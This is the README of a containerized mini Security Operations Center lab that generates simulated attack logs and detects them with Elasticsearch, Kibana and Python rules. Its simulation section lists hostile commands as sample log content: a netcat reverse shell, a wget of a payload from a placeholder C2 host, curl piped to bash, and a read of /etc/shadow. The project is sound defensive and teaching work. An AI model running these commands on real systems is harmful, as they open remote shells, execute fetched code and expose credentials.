# Mini-SOC — Automated Security Operations Center

A professional-grade, fully containerized Security Operations Center pipeline built for learning
and portfolio demonstration. Generates realistic attack simulations, ships logs through Filebeat
into Elasticsearch, detects threats with a Python detection engine, triggers automated responses,
and visualizes everything in Kibana.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                            Docker Network: soc-net                           │
│                                                                               │
│  log-generator ──(JSON logs)──► /logs/auth.log                               │
│                                        │                                     │
│  filebeat ◄──────────────────(tails)───┘                                     │
│      │                                                                        │
│      └──(HTTP 9200)──► elasticsearch ◄──────────────────────────────┐        │
│                              │                                       │        │
│                         kibana :5601               detection-api :8000        │
│                         SOC Dashboard              polls ES every 15s         │
│                         Stack Alerts               writes soc-alerts          │
│                                                         │                     │
│                                                   response-system :8001       │
│                                                   simulates/blocks IPs        │
│                                                   writes soc-blocked-ips      │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Pipeline

```
Log Generator → Filebeat → Elasticsearch → Detection API → Response System
                                ↓                ↓
                             Kibana          soc-alerts
                          SOC Overview     soc-blocked-ips
```

---

## Tech Stack

| Layer | Technology |
|---|---|
| Orchestration | Docker Compose |
| Storage & Search | Elasticsearch 8.13 |
| Visualization | Kibana 8.13 |
| Log Shipping | Filebeat 8.13 |
| Detection Engine | Python 3.12 + FastAPI + APScheduler |
| Response System | Python 3.12 + FastAPI |
| Log Generator | Python 3.12 + Faker |
| Testing | pytest + pytest-mock |

---

## Features

### Attack Simulation
- **SSH Brute Force** — bursts of 8 failed logins from known attacker IPs, compressed into a 30-second window (mimicking Hydra/Medusa)
- **Anomalous Login** — successful login at 2–4 AM from an external IP that has never been seen before
- **Dangerous Commands** — `wget http://c2.../payload.sh`, `nc -e /bin/bash 10.0.0.1 4444`, `curl | bash`, `cat /etc/shadow`

### Detection Rules (Python)
| Rule | Logic | Severity |
|---|---|---|
| `BruteForceRule` | >5 failed SSH logins from same IP within 60s | medium → critical |
| `AnomalousLoginRule` | Successful login preceded by ≥3 failures from same IP within 5m | high |
| `SuspiciousCommandRule` | Dangerous command patterns in shell logs within 60s | medium → critical |

All rules include **alert deduplication** — no alert storms during active attacks.

### Automated Response
- **Simulate mode** (default): logs `[SIMULATED] Would block IP X via iptables`
- **Enforce mode**: executes `iptables -A INPUT -s <ip> -j DROP` (requires `NET_ADMIN` capability)
- In-memory dedup with configurable block duration (default 1 hour)
- All response actions recorded in `soc-blocked-ips` Elasticsearch index

### Kibana Dashboard (auto-configured)
Six panels assembled into **SOC Overview**, auto-refreshing every 30 seconds:

| Panel | Data Source | Type |
|---|---|---|
| Attack Timeline | `soc-logs-*` | Line chart by scenario |
| Failed SSH Logins by IP | `soc-logs-*` (failures only) | Horizontal bar |
| Top Attacking IPs | `soc-logs-*` | Data table |
| Alerts Over Time | `soc-alerts` | Area chart by rule |
| Alerts by Severity | `soc-alerts` | Donut pie |
| Blocked IPs Count | `soc-blocked-ips` | Metric |

### Kibana Stack Alerting Rules (auto-configured)
Three native Kibana alerting rules visible under **Stack Management → Rules**:
- SOC: SSH Brute Force Detected
- SOC: Dangerous Command Executed
- SOC: Anomalous Login After Brute Force

---

## Quick Start

**Requirements:** Docker Desktop with at least 4 GB RAM allocated.

```bash
# Clone and start
git clone https://github.com/Gerijacki/Mini-SOC
cd Mini-SOC

# Start everything (first run pulls ~2 GB of images)
docker compose up --build

# Wait ~2 minutes for Elasticsearch to initialize, then:
open http://localhost:5601          # Kibana
# Navigate to: Dashboards → SOC Overview
```

Logs start flowing immediately. Kibana data appears within 30 seconds of Elasticsearch being ready.

---

## Usage

### Kibana

| URL | Description |
|---|---|
| `http://localhost:5601/app/dashboards` | SOC Overview dashboard |
| `http://localhost:5601/app/discover` | Raw log explorer |
| `http://localhost:5601/app/management/insightsAndAlerting/triggersActions/rules` | Stack alerting rules |

### Detection API

```bash
# Health check
curl http://localhost:8000/health

# List loaded detection rules
curl http://localhost:8000/rules

# Manually trigger a detection cycle (don't wait 15s)
curl -X POST http://localhost:8000/trigger

# Latest alerts
curl http://localhost:8000/alerts
```

### Response System

```bash
# Health check
curl http://localhost:8001/health

# Currently blocked IPs
curl http://localhost:8001/blocked
```

### Elasticsearch

```bash
# Log ingestion count
curl http://localhost:9200/soc-logs-*/_count

# Alert count
curl http://localhost:9200/soc-alerts/_count

# Blocked IPs count
curl http://localhost:9200/soc-blocked-ips/_count
```

---

## Configuration

All configuration lives in `.env` (copy from `.env.example`):

| Variable | Default | Description |
|---|---|---|
| `ELASTIC_VERSION` | `8.13.0` | Elastic Stack version |
| `LOGS_PER_SECOND` | `2` | Log generation rate |
| `ATTACK_RATIO` | `0.3` | Fraction of events that are attacks |
| `BRUTE_FORCE_BURST` | `8` | Failures per brute force burst |
| `DETECTION_POLL_INTERVAL` | `15` | Detection cycle interval (seconds) |
| `BRUTE_FORCE_THRESHOLD` | `5` | Failed logins to trigger alert |
| `BRUTE_FORCE_WINDOW` | `60` | Lookback window for brute force (seconds) |
| `RESPONSE_MODE` | `simulate` | `simulate` or `enforce` (real iptables) |
| `BLOCK_DURATION` | `3600` | Simulated block duration (seconds) |

---

## Project Structure

```
soc/
├── docker-compose.yml           # 7 services, shared networking
├── .env                         # Runtime config (not committed)
├── .env.example                 # Config template
│
├── log-generator/               # Generates realistic attack logs
│   ├── generator.py             # Main loop with RotatingFileHandler
│   ├── scenarios/
│   │   ├── brute_force.py       # SSH brute force bursts
│   │   ├── suspicious_login.py  # Off-hours login events
│   │   └── command_exec.py      # Dangerous shell commands
│   ├── utils/
│   │   └── ip_pool.py           # 20 attacker IPs + 10 trusted IPs
│   └── tests/
│       └── test_scenarios.py    # 20 unit tests
│
├── filebeat/
│   └── filebeat.yml             # Ships /logs/auth.log* → soc-logs-{date}
│
├── detection-api/               # FastAPI detection engine
│   ├── main.py                  # APScheduler polling loop + REST endpoints
│   ├── es_client.py             # Elasticsearch wrapper + bootstrap
│   ├── models.py                # Alert, AlertSeverity, HealthResponse
│   ├── rules/
│   │   ├── brute_force.py       # ES aggregation query
│   │   ├── anomalous_login.py   # Two-phase query
│   │   └── suspicious_cmd.py    # Match-phrase filter
│   └── tests/
│       ├── test_brute_force.py  # 8 unit tests
│       ├── test_anomalous_login.py  # 6 unit tests
│       └── test_suspicious_cmd.py   # 7 unit tests
│
├── response-system/             # FastAPI response handler
│   ├── responder.py             # POST /respond, GET /blocked, GET /health
│   └── tests/
│       └── test_responder.py    # 11 unit tests
│
└── kibana/
    └── setup/
        └── init_kibana.py       # Auto-configures Kibana on startup
```

---

## Elasticsearch Indices

| Index | Created by | Content |
|---|---|---|
| `soc-logs-{yyyy.MM.dd}` | Filebeat | Raw attack and normal events |
| `soc-alerts` | Detection API | Triggered detection alerts |
| `soc-blocked-ips` | Response System | IP block audit records |

### Key Log Fields

```json
{
  "@timestamp": "2026-04-27T14:23:11.432Z",
  "log_type": "auth",
  "source_ip": "185.220.101.45",
  "source_country": "RO",
  "username": "admin",
  "action": "ssh_login",
  "status": "failure",
  "hostname": "web-server-01",
  "scenario": "brute_force",
  "message": "Failed password for admin from 185.220.101.45 port 54321 ssh2"
}
```

---

## Testing

Tests run locally — no running Docker stack required (Elasticsearch is mocked).

```bash
# Detection API (21 tests)
cd detection-api
pip install -r requirements.txt
pytest tests/ -v

# Log Generator (20 tests)
cd log-generator
pip install -r requirements.txt
pytest tests/ -v

# Response System (11 tests)
cd response-system
pip install -r requirements.txt
pytest tests/ -v
```

### Test Coverage

| Component | Tests | Covers |
|---|---|---|
| `BruteForceRule` | 8 | threshold, dedup, severity scaling, multiple IPs, details |
| `AnomalousLoginRule` | 6 | two-phase detection, dedup, edge cases |
| `SuspiciousCommandRule` | 7 | severity by pattern, per-IP dedup, empty results |
| Log Generator Scenarios | 20 | field presence, timestamp format, IP pools, coherence |
| Response System | 11 | health, simulate mode, dedup, expiry, ES writes |

---

## Design Decisions

**`json.keys_under_root: true` in Filebeat** — lifts JSON fields to root level in Elasticsearch. Without this, `source_ip` would be nested under `message` and all detection queries would fail.

**APScheduler over raw asyncio** — `IntervalTrigger` handles missed executions gracefully and won't stack up if a detection cycle takes longer than the interval.

**Alert deduplication** — each rule checks for an existing alert with the same `source_ip + rule_name` within the last 5 minutes before writing a new one, preventing alert storms during active attacks.

**Separate response-system service** — the webhook pattern (`POST /respond`) decouples detection from response. The response service can evolve independently (SOAR integration, firewall APIs) without touching detection logic.

**`xpack.security.enabled=false`** — Elasticsearch 8.x enables TLS+auth by default. Disabled here to avoid certificate complexity in development.

---

## Roadmap

- [ ] React UI: alerts dashboard, blocked IPs manager, rule toggle
- [ ] Threat intelligence integration (IP reputation via AbuseIPDB or Shodan)
- [ ] ML-based anomaly detection (Isolation Forest on login time distributions)
- [ ] SOAR workflow integration (JIRA/PagerDuty connector)
- [ ] Multi-host support via Filebeat modules

---

## License

MIT
